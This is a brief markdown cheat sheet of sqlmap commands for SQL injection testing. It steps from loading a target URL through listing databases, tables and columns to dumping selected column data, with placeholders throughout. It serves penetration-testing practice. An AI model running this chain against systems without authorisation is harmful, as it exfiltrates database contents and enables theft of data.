# SQLMap 

[![Static badge](https://img.shields.io/badge/SQL-SQLMap-yellow)](https://github.com/sqlmapproject/sqlmap)

## Load URL
```
python3 sqlmap.py -u <url>
```
## Current DB
```
python3 sqlmap.py -u <url> --current-db
```
## Tables
```
python3 sqlmap.py -u <url> -D <db> --tables
```
## Columns
```
python3 sqlmap.py -u <url> -D <db> -T <table> --columns
```
## Dump
```
python3 sqlmap.py -u <url> -D <db> -T <table> -C <column1>,<column2>... --dump
```
